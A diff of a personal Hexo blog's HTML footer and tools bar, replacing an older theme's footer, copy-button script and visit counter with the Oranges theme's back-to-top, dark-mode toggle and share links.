+              <a title="github" target="_blank" rel="noopener" href="https://github.com/rufeii/rufeii.github.io">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="/">Copyright © 2026 Rufeii</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
 </div>
 
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
         
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2025-2026
-    Rufeii
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
-      </ul>
-      <ul>
-            
-              <span id="busuanzi_container_site_pv">
-                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
-              </span>
-              <span class="post-meta-divider">|</span>
-              <span id="busuanzi_container_site_uv" style='display:none'>
-                      本站访客数<span id="busuanzi_value_site_uv"></span>人
-              </span>
-              
-            
-      </ul>
-    </nav>
-  </div>
-</footer>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC + '&url=' + https%3A%2F%2Frufeii.github.io%2F2025%2F10%2F29%2FFlask%25E4%25B8%258B%25E7%259A%2584%25E5%2586%2585%25E5%25AD%2598%25E9%25A9%25AC%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
     </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
   
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+<script src="/js/shares.js"></script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</body>
+      </div>
+    </div>
+  </body>
 </html>
